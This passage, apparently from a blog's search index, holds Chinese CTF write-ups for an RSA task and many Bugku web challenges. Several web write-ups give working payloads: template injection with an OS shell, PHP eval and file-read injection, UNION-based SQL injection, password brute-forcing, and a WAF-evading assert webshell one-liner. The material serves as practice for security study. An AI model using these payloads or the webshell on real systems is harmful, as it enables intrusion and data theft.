Vidar-Team"]},{"title":"2022HWS硬件安全冬令营XDASCTFJan","url":"/2022/01/28/2022HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%86%AC%E4%BB%A4%E8%90%A5XDASCTFJan/","content":"<h4 id=\"这个比赛，我看了一看题目，做了一下，发现好难，只是挑了一个简单的题目做了做，还是个密码学问题。\"><a href=\"#这个比赛，我看了一看题目，做了一下，发现好难，只是挑了一个简单的题目做了做，还是个密码学问题。\" class=\"headerlink\" title=\"这个比赛，我看了一看题目，做了一下，发现好难，只是挑了一个简单的题目做了做，还是个密码学问题。\"></a>这个比赛，我看了一看题目，做了一下，发现好难，只是挑了一个简单的题目做了做，还是个密码学问题。</h4><span id=\"more\"></span>\n\n<h5 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h5><h6 id=\"babyrsa\"><a href=\"#babyrsa\" class=\"headerlink\" title=\"babyrsa\"></a>babyrsa</h6><p>1.查看py代码，发现是普通的rsa加密，打开enc文件，根据代码可以三部分分别为N，e，密文。</p>\n<p>2.用工具把N分解成p q，</p>\n<p><img src=\"/2022/01/28/2022HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%86%AC%E4%BB%A4%E8%90%A5XDASCTFJan/image-20220128114459853.png\" alt=\"image-20220128114459853\"></p>\n<p>3.填入p，q，e，密文，工具解密，可得flag。</p>\n<p><img src=\"/2022/01/28/2022HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%86%AC%E4%BB%A4%E8%90%A5XDASCTFJan/image-20220128114513850.png\" alt=\"image-20220128114513850\"></p>\n<p>获取flag的截图</p>\n<p><img src=\"/2022/01/28/2022HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%86%AC%E4%BB%A4%E8%90%A5XDASCTFJan/image-20220128114535548.png\" alt=\"image-20220128114535548\"></p>\n<p>所以是hwctf{01d_Curs3_c4Me_Again}</p>\n","categories":["ctf比赛"],"tags":["觉得自己好菜"]},{"title":"BugkuWeb题目","url":"/2022/04/24/BugkuWeb%E9%A2%98%E7%9B%AE/","content":"<p>题目非常适合新手</p>\n<span id=\"more\"></span>\n\n<h3 id=\"Bugku-web-类型90-的题目，剩下的难的决定再找时间更新。\"><a href=\"#Bugku-web-类型90-的题目，剩下的难的决定再找时间更新。\" class=\"headerlink\" title=\"Bugku web 类型90%的题目，剩下的难的决定再找时间更新。\"></a>Bugku web 类型90%的题目，剩下的难的决定再找时间更新。</h3><h4 id=\"Simple-SSTI-1\"><a href=\"#Simple-SSTI-1\" class=\"headerlink\" title=\"Simple_SSTI_1\"></a>Simple_SSTI_1</h4><h5 id=\"考察flask\"><a href=\"#考察flask\" class=\"headerlink\" title=\"考察flask\"></a>考察flask</h5><p>提示我们在flask里，经常设置一个secret_key变量，这里就得讲一下了，首先是Jinjan2 基础语法<br>分为三种：</p>\n<p>{ %  …  % }</p>\n\n\n\n<p>不过一般做题大部分都是第二种，因为这道题提示了是SSTI，所以也就不用判断了，一般情况下可以使用6，来判断会不会回显出 2x3 的值<br>其次是config的用法，config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值，所以可以使用 config.xxx 来查看该对象的属性值。(值需要大写)<br>所以，这道题最后的payload就是</p>\n<p><a href=\"http://114.67.246.176:10460/?flag=\">http://114.67.246.176:10460/?flag=</a></p>\n<h4 id=\"eval\"><a href=\"#eval\" class=\"headerlink\" title=\"eval\"></a>eval</h4><h5 id=\"拼接引号闭合，print-r-file-“-flag-php”-打印文件\"><a href=\"#拼接引号闭合，print-r-file-“-flag-php”-打印文件\" class=\"headerlink\" title=\"拼接引号闭合，print_r(file(“./flag.php”));打印文件\"></a>拼接引号闭合，print_r(file(“./flag.php”));打印文件</h5><p>eval( “var_dump($a);”); //拼接使用’’);’’拼接，print_r(file(“./flag.php”));打印文件，以及//注释</p>\n<p>payload：[114.67.175.224:12781/?hello= 1);print_r(file(“flag.php”));//](<a href=\"http://114.67.175.224:12781/?hello=\">http://114.67.175.224:12781/?hello=</a> 1);print_r(file(“flag.php”));//)</p>\n<h4 id=\"网站被黑\"><a href=\"#网站被黑\" class=\"headerlink\" title=\"网站被黑\"></a>网站被黑</h4><h5 id=\"1-使用御剑后台扫描工具发现\"><a href=\"#1-使用御剑后台扫描工具发现\" class=\"headerlink\" title=\"1.使用御剑后台扫描工具发现\"></a>1.使用御剑后台扫描工具发现</h5><h5 id=\"http-114-67-175-224-17941-shell-php是一个后台登陆\"><a href=\"#http-114-67-175-224-17941-shell-php是一个后台登陆\" class=\"headerlink\" title=\"http://114.67.175.224:17941/shell.php是一个后台登陆\"></a><a href=\"http://114.67.175.224:17941/shell.php%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86\">http://114.67.175.224:17941/shell.php是一个后台登陆</a></h5><h5 id=\"2-使用burpsuite爆破密码\"><a href=\"#2-使用burpsuite爆破密码\" class=\"headerlink\" title=\"2.使用burpsuite爆破密码\"></a>2.使用burpsuite爆破密码</h5><p>发现密码是hack，登陆即可得到flag</p>\n<h4 id=\"本地管理员\"><a href=\"#本地管理员\" class=\"headerlink\" title=\"本地管理员\"></a>本地管理员</h4><h5 id=\"1-查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。\"><a href=\"#1-查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。\" class=\"headerlink\" title=\"1.查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。\"></a>1.查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。</h5><h5 id=\"2-构造X-Forwarded-For-127-0-0-1，再次登录成功得到flag。\"><a href=\"#2-构造X-Forwarded-For-127-0-0-1，再次登录成功得到flag。\" class=\"headerlink\" title=\"2.构造X-Forwarded-For: 127.0.0.1，再次登录成功得到flag。\"></a>2.构造X-Forwarded-For: 127.0.0.1，再次登录成功得到flag。</h5><h4 id=\"变量1\"><a href=\"#变量1\" class=\"headerlink\" title=\"变量1\"></a>变量1</h4><p>flag In the variable ! &lt;?php</p>\n<p>error_reporting(0);<br>include “flag1.php”;<br>highlight_file(<strong>file</strong>);<br>if(isset($_GET[‘args’])){<br>$args = $_GET[‘args’];<br>if(!preg_match(“/^\\w+$/“,$args)){   //正则匹配所有数字字母下划线<br>die(“args error!”);<br>}<br>eval(“var_dump($$args);”);<br>}<br>?&gt;</p>\n<p>抓住两个地方，一个是正则表达式匹配，不匹配则直接die，该正则表达式应该是匹配都是字母的串。然后最关键的是最后的$$args,这是可变变量的意思，如$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名，那么PHP的九大全局变量，一个一个试。</p>\n<ul>\n<li>$_POST [用于接收post提交的数据]</li>\n<li>$_GET [用于获取url地址栏的参数数据]</li>\n<li>$_FILES [用于文件就收的处理img 最常见]</li>\n<li>$_COOKIE [用于获取与setCookie()中的name 值]</li>\n<li>$_SESSION [用于存储session的值或获取session中的值]</li>\n<li>$_REQUEST [具有get,post的功能，但比较慢]</li>\n<li>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</li>\n<li>$GLOBALS [一个包含了全部变量的全局组合数组]</li>\n<li>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</li>\n</ul>\n<p>当args=GLOBALS时，flag出现。</p>\n<p>array(7) { [“GLOBALS”]=&gt; <em>RECURSION</em> [“_POST”]=&gt; array(0) { } [“_GET”]=&gt; array(1) { [“args”]=&gt; string(7) “GLOBALS” } [“_COOKIE”]=&gt; array(0) { } [“_FILES”]=&gt; array(0) { } [“ZFkwe3”]=&gt; string(38) “flag{92853051ab894a64f7865cf3c2128b34}” [“args”]=&gt; string(7) “GLOBALS” }</p>\n<h4 id=\"Simple-SSTI-2\"><a href=\"#Simple-SSTI-2\" class=\"headerlink\" title=\"Simple_SSTI_2\"></a>Simple_SSTI_2</h4><h5 id=\"1-学习网址-SSTI（模板注入）漏洞（入门篇）-bmjoker-博客园-cnblogs-com\"><a href=\"#1-学习网址-SSTI（模板注入）漏洞（入门篇）-bmjoker-博客园-cnblogs-com\" class=\"headerlink\" title=\"1.学习网址 SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)\"></a><a href=\"https://www.cnblogs.com/bmjoker/p/13508538.html\">1.学习网址 SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></h5><p>使用的是python中的Jinja2模板注入</p>\n<h5 id=\"2-使用tplmap\"><a href=\"#2-使用tplmap\" class=\"headerlink\" title=\"2.使用tplmap\"></a>2.使用tplmap</h5><p>python tplmap.py -u <a href=\"http://114.67.175.224:17061/?flag=1\">http://114.67.175.224:17061/?flag=1</a> –os-shell</p>\n<p>cat flag即可得到flag</p>\n<h4 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h4><h5 id=\"1查看源代码\"><a href=\"#1查看源代码\" class=\"headerlink\" title=\"1查看源代码\"></a>1查看源代码</h5><p> var p1 = ‘%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62’; var p2 = ‘%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b’; eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));</p>\n<h5 id=\"2-使用url解码\"><a href=\"#2-使用url解码\" class=\"headerlink\" title=\"2.使用url解码\"></a>2.使用url解码</h5><p>var p1 = ‘function checkSubmit(){var a=document.getElementById(“password”);if(“undefined”!=typeof a){if(“67d709b2b’;</p>\n<p>var p2 = ‘aa648cf6e87a7114f1”==a.value)return!0;alert(“Error”);a.focus();return!1}}document.getElementById(“levelQuest”).onsubmit=checkSubmit;’;<br>eval(unescape(p1)   unescape(‘54aa2’   p2));</p>\n<h5 id=\"3-输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag\"><a href=\"#3-输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag\" class=\"headerlink\" title=\"3.输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag\"></a>3.输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag</h5><h4 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h4><h6 id=\"构造利用php-filter\"><a href=\"#构造利用php-filter\" class=\"headerlink\" title=\"构造利用php://filter\"></a>构造利用php://filter</h6><p>  利用php流filter返回base64加密后的php源代码，如下代码和截图所示，我们可以利用php的filter机制来得到我们想要的php源代码。这里假设源代码文件为index.php，且在网站根目录下，构造payload会获取到对应代码的base64编码，然后再解密即可<br>即?file=php://filter/convert.base64-encode/resource=index</p>\n<p><a href=\"http://114.67.175.224:13308/index.php?file=php://filter/convert.base64-encode/resource=index.php\">Bugku-web</a></p>\n<p>再base64解码即可得到flag</p>\n<h4 id=\"好像需要密码\"><a href=\"#好像需要密码\" class=\"headerlink\" title=\"好像需要密码\"></a>好像需要密码</h4><h5 id=\"用burp爆破密码，线程数设置成50。可以得到密码12468\"><a href=\"#用burp爆破密码，线程数设置成50。可以得到密码12468\" class=\"headerlink\" title=\"用burp爆破密码，线程数设置成50。可以得到密码12468\"></a>用burp爆破密码，线程数设置成50。可以得到密码12468</h5><h4 id=\"Flask-FileUpload\"><a href=\"#Flask-FileUpload\" class=\"headerlink\" title=\"Flask_FileUpload\"></a>Flask_FileUpload</h4><h5 id=\"1-在图片中写入在上传\"><a href=\"#1-在图片中写入在上传\" class=\"headerlink\" title=\"1.在图片中写入在上传\"></a>1.在图片中写入在上传</h5><p>import os<br>os.system(‘find /* |grep flag’)<br>os.system(‘cat /flag’)</p>\n<h5 id=\"2-查看网页源代码即可得到flag\"><a href=\"#2-查看网页源代码即可得到flag\" class=\"headerlink\" title=\"2.查看网页源代码即可得到flag\"></a>2.查看网页源代码即可得到flag</h5><h4 id=\"备份是个好习惯\"><a href=\"#备份是个好习惯\" class=\"headerlink\" title=\"备份是个好习惯\"></a>备份是个好习惯</h4><h5 id=\"1-使用网址后面加index-php-bak获得php的源代码\"><a href=\"#1-使用网址后面加index-php-bak获得php的源代码\" class=\"headerlink\" title=\"1.使用网址后面加index.php.bak获得php的源代码\"></a>1.使用网址后面加index.php.bak获得php的源代码</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/**</span><br><span class=\"line\"></span><br><span class=\"line\"> * Created by PhpStorm.</span><br><span class=\"line\"> * User: Norse</span><br><span class=\"line\"> * Date: <span class=\"number\">2017</span>/<span class=\"number\">8</span>/<span class=\"number\">6</span></span><br><span class=\"line\"> * Time: <span class=\"number\">20</span>:<span class=\"number\">22</span></span><br><span class=\"line\">   */</span><br><span class=\"line\"></span><br><span class=\"line\">include_once <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\">ini_set(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$<span class=\"built_in\">str</span> = strstr($_SERVER[<span class=\"string\">&#x27;REQUEST_URI&#x27;</span>], <span class=\"string\">&#x27;?&#x27;</span>);  //得到网址?以及后面的字符串</span><br><span class=\"line\">$<span class=\"built_in\">str</span> = substr($<span class=\"built_in\">str</span>,<span class=\"number\">1</span>);           \t//从第一个字符开始取</span><br><span class=\"line\">$<span class=\"built_in\">str</span> = str_replace(<span class=\"string\">&#x27;key&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>,$<span class=\"built_in\">str</span>);  //将key换为空  双写绕过</span><br><span class=\"line\">parse_str($<span class=\"built_in\">str</span>);       //key1[]=<span class=\"number\">1</span>&amp;key2[]=<span class=\"number\">2</span> 会转换为</span><br><span class=\"line\">Array</span><br><span class=\"line\">(</span><br><span class=\"line\">    [key1] =&gt; Array</span><br><span class=\"line\">        (</span><br><span class=\"line\">            [<span class=\"number\">0</span>] =&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">    [key2] =&gt; Array</span><br><span class=\"line\">        (</span><br><span class=\"line\">            [<span class=\"number\">0</span>] =&gt; <span class=\"number\">2</span></span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">)</span><br><span class=\"line\">echo md5($key1);</span><br><span class=\"line\"></span><br><span class=\"line\">echo md5($key2);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;  //md5过滤 数组绕过</span><br><span class=\"line\">    echo $flag.<span class=\"string\">&quot;取得flag&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"114-67-175-224-17086-kekeyy1-1-amp-kekeyy2-2\"><a href=\"#114-67-175-224-17086-kekeyy1-1-amp-kekeyy2-2\" class=\"headerlink\" title=\"[114.67.175.224:17086/?kekeyy1]=1&amp;kekeyy2[]=2\"></a>[114.67.175.224:17086/?kekeyy1<a href=\"http://114.67.175.224:17086/?kekeyy1%5B%5D=1&kekeyy2%5B%5D=2\">]=1&amp;kekeyy2[]=2</a></h5><p>构造?kekeyy1[]=1&amp;kekeyy2[]=2</p>\n<h4 id=\"game1\"><a href=\"#game1\" class=\"headerlink\" title=\"game1\"></a>game1</h4><h5 id=\"1-玩完游戏抓包可以得到：\"><a href=\"#1-玩完游戏抓包可以得到：\" class=\"headerlink\" title=\"1.玩完游戏抓包可以得到：\"></a>1.玩完游戏抓包可以得到：</h5><p>GET /score.php?score=100&amp;ip=111.37.4.192&amp;sign=zMMTAw== HTTP/1.1  得分为100</p>\n<p>GET /score.php?score=50&amp;ip=111.37.4.192&amp;sign=zMNTA=== HTTP/1.1      得分为50</p>\n<h5 id=\"2-查找score-php在源代码里\"><a href=\"#2-查找score-php在源代码里\" class=\"headerlink\" title=\"2.查找score.php在源代码里\"></a>2.查找score.php在源代码里</h5><table>\n<thead>\n<tr>\n<th align=\"left\"></th>\n<th>var ppp=’111.37.4.192’;</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"></td>\n<td>var sign = Base64.encode(score.toString());</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td>xmlhttp.open(“GET”,”score.php?score=”+score+”&amp;ip=”+ppp+”&amp;sign=”+sign,true);</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td>xmlhttp.send();</td>\n</tr>\n</tbody></table>\n<h5 id=\"3-找到规律为sign-’zM’-base64-score-’-’\"><a href=\"#3-找到规律为sign-’zM’-base64-score-’-’\" class=\"headerlink\" title=\"3.找到规律为sign=’zM’+base64(score)+’==’\"></a>3.找到规律为sign=’zM’+base64(score)+’==’</h5><p>直接提交一个大的分数<a href=\"http://114.67.175.224:16128//score.php?score=10000&ip=111.37.4.192&sign=zMMTAwMDA===\">114.67.175.224:16128//score.php?score=10000&amp;ip=111.37.4.192&amp;sign=zMMTAwMDA===</a></p>\n<p>即可得到flag</p>\n<h4 id=\"成绩查询-一个非常好的联合注入实战题目-强烈推荐-建议永久收藏\"><a href=\"#成绩查询-一个非常好的联合注入实战题目-强烈推荐-建议永久收藏\" class=\"headerlink\" title=\"成绩查询(一个非常好的联合注入实战题目 强烈推荐 建议永久收藏)\"></a>成绩查询(一个非常好的联合注入实战题目 强烈推荐 建议永久收藏)</h4><h5 id=\"注意联合注入时前式必须返回为空\"><a href=\"#注意联合注入时前式必须返回为空\" class=\"headerlink\" title=\"注意联合注入时前式必须返回为空\"></a>注意联合注入时前式必须返回为空</h5><p>然后尝试获取列数，因为已经有名字和三科成绩了，所以就测试4或者更高，得知是4列 </p>\n<h5 id=\"因为构造id-1’-order-by-5-时，没有正常回显，id-1’-order-by-4-时，正常回显，所以判断有4列\"><a href=\"#因为构造id-1’-order-by-5-时，没有正常回显，id-1’-order-by-4-时，正常回显，所以判断有4列\" class=\"headerlink\" title=\"因为构造id=1’ order by 5#时，没有正常回显，id=1’ order by 4#时，正常回显，所以判断有4列\"></a>因为构造id=1’ order by 5#时，没有正常回显，id=1’ order by 4#时，正常回显，所以判断有4列</h5><p>1’ order by 4#  //有数据说明有4列</p>\n<h5 id=\"1-用联合查询进行注入则：页面必须有显示位。-2-union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同\"><a href=\"#1-用联合查询进行注入则：页面必须有显示位。-2-union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同\" class=\"headerlink\" title=\"1.用联合查询进行注入则：页面必须有显示位。 2.union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同\"></a>1.用联合查询进行注入则：页面必须有显示位。 2.union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同</h5><p>0’ union select 11,22,33,SCHEMA_NAME from information_schema.SCHEMATA#  //返回information_schema 返回一个数据库名</p>\n<p>0’ union select 1,2,3,(select group_concat(SCHEMA_NAME)from information_schema.SCHEMATA)#  //返回 information_schema,mysql,skctf,test   group_concat()一次性显示，即返回所有的数据库名</p>\n<p>0’ union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’information_schema’)# 返回CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS</p>\n<p>0’ union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’skctf’)# 返回 fl4g,sc</p>\n<p>-1’ union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=’skctf’ and table_name=’fl4g’)# 返回 skctf_flag</p>\n<p>-1’ union select 1,2,3,(select skctf_flag from fl4g)# 即可得到flag</p>\n<p>-1’ union select 1,2,3,(select user())#   #返回root@localhost 说明是root用户</p>\n<p>-1’ UNION SELECT 1,2,database(),user()# skctf  root@localhost 说明当前数据库名称是 skctf</p>\n<p>通过以上命令就可以得到所有有关这个数据库的所有信息</p>\n<h4 id=\"cookies\"><a href=\"#cookies\" class=\"headerlink\" title=\"cookies\"></a>cookies</h4><h5 id=\"1-a2V5cy50eHQ-是keys-php，修改index-php的base64为filename，可以获得php的源代码。\"><a href=\"#1-a2V5cy50eHQ-是keys-php，修改index-php的base64为filename，可以获得php的源代码。\" class=\"headerlink\" title=\"1.a2V5cy50eHQ= 是keys.php，修改index.php的base64为filename，可以获得php的源代码。\"></a>1.a2V5cy50eHQ= 是keys.php，修改index.php的base64为filename，可以获得php的源代码。</h5><p>用python写</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">    response = requests.get(<span class=\"string\">&quot;http://114.67.175.224:14233/index.php?line=&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<!--?php\n\nerror_reporting(0);\n\n$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");\n\n$line=isset($_GET['line'])?intval($_GET['line']):0;\n\nif($file=='') header(\"location:index.php?line=&filename=a2V5cy50eHQ=\");\n\n$file_list = array(\n\n'0' =>'keys.txt',\n\n'1' =>'index.php',\n\n);\n\nif(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){\n\n$file_list[2]='keys.php';\n\n}\n\nif(in_array($file, $file_list)){\n\n$fa = file($file);\n\necho $fa[$line];\n\n}\n\n?>\n\n##### 2.根据源代码可知需构造\n\nGET /index.php?line=0&filename=a2V5cy5waHA= HTTP/1.1   //文件时keys.php\n\nCookie: margin=margin;  //发送即可得到flag\n\n#### bp\n\n##### 根据题目密码时6位，z开头，且是top1000弱密码\n\n搜索查找可以得到密码zxc123，输入即可得到flag。或者使用python筛选，再用bp爆破。\n\n#### source\n\n##### 1.打开发现什么也没有，猜测使用目录扫描，用御剑扫描什么也扫不出来，那就用kali自带的dirbuster扫描，30线程数，选择/usr/share/wordlists/dirb/common.txt文件，选择auto switch(Head and get) ,list based brute force,urlfuzz,填上/.{dir}开始扫描。\n\nStarting OWASP DirBuster 1.0-RC1\nStarting URL fuzz\nStarting fuzz on http://114.67.175.224:18239/.{dir}\nDir found: /. - 200\nDir found: /.git - 301\nDir found: /.htdig - 403\nDir found: /.hta - 403\nDir found: /.html - 403\nDir found: /.htdoc - 403\nDir found: /.htmls - 403\nDir found: /.htdocs - 403\nDir found: /.htbin - 403\nDir found: /.htm - 403\nDir found: /.ht - 403\nDir found: /.htpasswd - 403\nDir found: /.httpd - 403\nDir found: /.httpdocs - 403\nDir found: /.httpmodules - 403\nDir found: /.http - 403\nDir found: /.httpuser - 403\nDir found: /.https - 403\nDir found: /.htmlarea - 403\nDir found: /.php - 403\nDir found: /.phps - 403\nDir found: /.phtml - 403\n\n##### 2.301重定向，403拒绝访问，因此找到。git文件。\n\n**使用wget -r http://114.67.246.176:14508/.git下载文件**\n\n**查找目录下的所有文件中是否含有某个字符串**** \n**find .|xargs grep -ri \"IBM\"** \n**查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名** \n**find .|xargs grep -ri \"IBM\" -l**** \n\n###### git reflog命令：可以叫做显示可引用的历史版本记录\n\nd256328 HEAD@{0}: reset: moving to d25632\n13ce8d0 HEAD@{1}: commit: flag is here?\nfdce35e HEAD@{2}: reset: moving to fdce35e\ne0b8e8e HEAD@{3}: reset: moving to e0b8e\n40c6d51 HEAD@{4}: commit: flag is here?\nfdce35e HEAD@{5}: commit: flag is here?\nd256328 HEAD@{6}: commit: flag is here?\ne0b8e8e HEAD@{7}: commit (initial): this is index.html\n\n###### git show可以用于显示提交日志的相关信息（以不同格式或信息量的多少）\n\ngit show 40c6d51 （一个一个的试）即可得到flag。\n\n#### 社工-伪造\n\n##### 此题的qq是和现实qq绑定的，修改头像和qq名称，再登陆，发送flag即可得到flag。\n\n#### 社工-初步收集\n\n###### 知识点\n\n###### 这里的话，设计一个知识点就是遇到这种开挂的软件或者别的软件时，我们可以查看流量的走向，这里就需要使用工具——[wireshark](https://so.csdn.net/so/search?q=wireshark&spm=1001.2101.3001.7020)就行抓流量包进行分析\n\n###### SMTP是一个相对简单的基于文本的协议。\n\n##### 1.打开网址发现啥也没有，老规矩先用御剑扫描目录。\n\n可以找到config.php, includes/, admin/, admin/index.php, admin/login.php, admin/logo.php, index.php?.php, ?.php\n\n##### 2.打开login.php,发现是一个后台登陆界面。尝试一下弱口令登录失败。\n\n##### 3.下载网址提供的软件，打开用wireshark抓包，搜索SMTP\n\n发现from: bugkuku@163.com, subjet: =?gb2312?B0KGx8NbCyc+1scHLo6GjoaOh?=,\n\nUser: YnVna3VrdUAxNjMuY29t   Pass:WFNMUk9DUE1OV1daUURaTA==\n\nbase64解码bugkuku@163.com   XSLROCPMNWWZQDZL  后台发现登陆不上，看其账号应该是一个邮箱登陆的账号密码。但是163邮箱登陆不上，第二个应该是授权码。\n\n##### 3.下一个手机qq邮箱，使用163邮箱+授权码登陆\n\n一直向下滑找到一封特别的邮件，说给mara发生日礼物，通过照片猜测其生日是20010206，登陆后台。\n\n成功找到flag。\n\n##### 总结社工很离谱。\n\n#### shell\n\n##### 总结php代码执行函数eval(),assert(),preg_replace(),creat_function(),arry_map(),call_user_func(),call_user_func_array(),array_filter(),uasort()\n\n送给大家一个过狗一句话 $poc=\"a#s#s#e#r#t\"; $poc_1=explode(\"#\",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s'])\n\n代码意思是用explode函数使用#将$poc分成一个数组，再使用poc_2将poc_1数组组合即assert，再用assert执行代码执行函数，即system('ls')\n\n构造 ?s=system('ls')和?s=system(\"cat flaga15808abee46a1d5.txt\")即可得到flag\n\n#### 速度要快\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://114.67.175.224:17682/&#x27;</span></span><br><span class=\"line\">r=requests.session()//因为get和post请求头不同，所以需要建立一个会话</span><br><span class=\"line\">res=r.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">enflag=res.headers[<span class=\"string\">&#x27;flag&#x27;</span>] //打印响应头flag的信息</span><br><span class=\"line\"></span><br><span class=\"line\">deflag=base64.b64decode(enflag) //对flag的值base64解密</span><br><span class=\"line\">flag=deflag.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>).split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>] //用“：”将解密后的flag分割取第二个</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">deflag1=base64.b64decode(flag).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>) //再把第二个flag的值解密</span><br><span class=\"line\"><span class=\"built_in\">print</span>(deflag1)</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\"><span class=\"string\">&#x27;margin&#x27;</span>:deflag1    //添加两次base64解密的值（是一串数字）</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.post(url,data=data).text)   //使用用一个会话发送post请求，即可得到flag</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.post(url,data=data).headers)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"前女友\"><a href=\"#前女友\" class=\"headerlink\" title=\"前女友\"></a>前女友</h4><h5 id=\"点击链接即可得到得到index-php的源代码\"><a href=\"#点击链接即可得到得到index-php的源代码\" class=\"headerlink\" title=\"点击链接即可得到得到index.php的源代码\"></a>点击链接即可得到得到index.php的源代码</h5><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v1&#x27;</span>]) 